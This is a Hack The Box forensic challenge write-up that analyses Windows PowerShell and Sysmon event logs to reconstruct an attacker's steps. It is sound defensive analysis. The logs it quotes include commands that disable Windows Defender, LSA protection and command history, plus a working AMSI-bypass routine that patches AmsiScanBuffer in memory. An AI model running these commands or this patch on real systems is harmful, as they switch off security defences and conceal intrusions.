---
permalink: /misc/htb/smoke-and-mirrors
title: Smoke & Mirrors
---

<br>



<br>

<br>

<https://app.hackthebox.com/sherlocks/Operation%2520Blackout%25202025%253A%2520Smoke%2520%2526%2520Mirrors?tab=play_sherlock>




<br>

<br>


<img width="734" height="155" alt="image" src="https://github.com/user-attachments/assets/4d7a3c85-33ad-47e8-9112-f319cafd089c" />



<br>

<br>


There is no machine, just a zip file containing 3 .evtx files

<br>

```
$ ls
Microsoft-Windows-Powershell.evtx  Microsoft-Windows-Powershell-Operational.evtx  Microsoft-Windows-Sysmon-Operational.evtx
```



<br>


Usually you just open .evtx files with Event Viewer on windows, but I’ll test on the rust tool evtx_dump on linux.

```
yay -S evtx
```

<br>


```
[~/t] 
$ evtx_dump Microsoft-Windows-Powershell-Operational.evtx -o json > Powershell-Operational.json

[~/t] 
$ evtx_dump Microsoft-Windows-Powershell.evtx -o json > Powershell.json

[~/t] 
$ evtx_dump Microsoft-Windows-Sysmon-Operational.evtx -o json > Sysmon-Operational.json
```


<br>


<br>

<img width="1377" height="175" alt="image" src="https://github.com/user-attachments/assets/b877633f-f26b-477e-aec4-e4e8ca6dc4d8" />


<br>

<br>



```python
from json import loads
for line in open('Powershell.json').read().splitlines()[1::2][::-1]:
    j = loads(line)["Event"]

    eventdata = j.get("EventData").get('Data').get('#text')
    print(f'{eventdata = }\n\n\n\n')
```

<br>


The Powershell.json seemed not so useful? no commands? so I moved on to Powershell-Operational.json

<br>


```python
from json import loads
for line in open('Powershell-Operational.json').read().splitlines()[1::2][::-1]:
    j = loads(line)["Event"]

    eventdata = j.get("EventData")
    if eventdata is not None:
        payload = eventdata.get("Payload")
        if payload is not None:
            print(f'payload: {payload}')
```

<br>

<br>

The commands/outputs didn't have any registry keys, but scriptblocks did!

<br>


```python
from json import loads
for line in open('Powershell-Operational.json').read().splitlines()[1::2][::-1]:
    j = loads(line)["Event"]

    eventdata = j.get("EventData")
    if eventdata is not None:
        #payload = eventdata.get("Payload")
        #if payload is not None:
        #    print(f'payload: {payload}')
        scriptblocktext = eventdata.get("ScriptBlockText")
        if scriptblocktext is not None:
            print(f'scriptblocktext: {scriptblocktext}')

```


<br>


```
...
scriptblocktext: C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All
scriptblocktext: prompt
scriptblocktext: reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
scriptblocktext: $Host
scriptblocktext: prompt
scriptblocktext: prompt
scriptblocktext: reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
scriptblocktext: $Host
scriptblocktext: prompt
scriptblocktext: prompt
scriptblocktext: cls
scriptblocktext: prompt
scriptblocktext: reg add /?
scriptblocktext: prompt
scriptblocktext: reg add
scriptblocktext: $Host
scriptblocktext: prompt
scriptblocktext: function Test-UnnecessaryFiles([string]$folder = $(throw "No folder is specified")) {
...
```


<br>

Q1: `HKLM\SYSTEM\CurrentControlSet\Control\LSA`


<br>

<br>


<img width="712" height="169" alt="image" src="https://github.com/user-attachments/assets/b8b73504-33a8-4060-8e36-9992cf6f81be" />

<br>

<br>



```
...
scriptblocktext: Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true
scriptblocktext: prompt
scriptblocktext: cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
scriptblocktext: prompt
scriptblocktext: { Set-StrictMode -Version 1; $_.OriginInfo }
scriptblocktext: { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
scriptblocktext: { Set-StrictMode -Version 1; $_.PSMessageDetails }
scriptblocktext: prompt

...
```

Q2: `Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true`

<br>

<br>


<img width="1382" height="191" alt="image" src="https://github.com/user-attachments/assets/e90647ac-8b47-4897-888c-ad3822e681cf" />


<br>

<br>

```powershell
scriptblocktext: function Disable-Protection {
    $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static bool Patch() {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
```


Q3: `AmsiScanBuffer`


<br>

<br>


<img width="603" height="179" alt="image" src="https://github.com/user-attachments/assets/87d1ad48-c281-4737-8364-2d3bbd76b7cc" />


<br>

<br>


I just searched for safe (but they want you to add .exe at the end, I think they looked through the Sysmon one instead of the Powershell-Operational):

<br>


```
scriptblocktext: bcdedit /set safeboot network
```

<br>


Q4: `bcdedit.exe /set safeboot network`

<br>

<br>





<img width="799" height="168" alt="image" src="https://github.com/user-attachments/assets/ade69691-a6a3-44e9-a035-a36b37b94e16" />


<br>

<br>

I just searched for istory and found this:

<br>

scriptblocktext: Set-PSReadlineOption -HistorySaveStyle SaveNothing


<br>



Q5: `scriptblocktext: Set-PSReadlineOption -HistorySaveStyle SaveNothing`




<br>


<br>


<br>


<br>


I tried to make a tool for future use too:

```python
# pip install evtx
# run as admin

# NOTE windows does not log every executed powershell command by default.
# Powershell logging policies can be configured via registry or group polkicy.

# to check if logging is enabled: (if error it is not enabled)
# Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"


# run this as admin to enable:

"""
$RegistryPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (!(Test-Path $RegistryPath)) { New-Item -Path $RegistryPath -Force }
Set-ItemProperty -Path $RegistryPath -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
"""








from json import loads
from evtx import PyEvtxParser
from datetime import datetime

evtx_path = "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx"
events = []
for record in PyEvtxParser(evtx_path).records_json():
    event = loads(record['data']).get('Event')
    datetime = event.get('System').get('TimeCreated').get('#attributes').get('SystemTime')
    events.append( (datetime, event) )



for (datetime, event) in sorted(events):
    date, time = datetime.split('T')
    year, month, day = date.split('-')

    # you can filter here
    #if year != '2026' or month != '08':
    #    continue

    eventdata = event.get("EventData")
    scriptblocktext = None
    if eventdata is not None:

        scriptblocktext = eventdata.get("ScriptBlockText")
        if scriptblocktext is not None:
                print(f'scriptblocktext {date} {time}: {scriptblocktext}')

        payload = eventdata.get("Payload")
        if payload is not None:
            print(f'payload {date} {time}: {payload}')
```


<br>

<br>

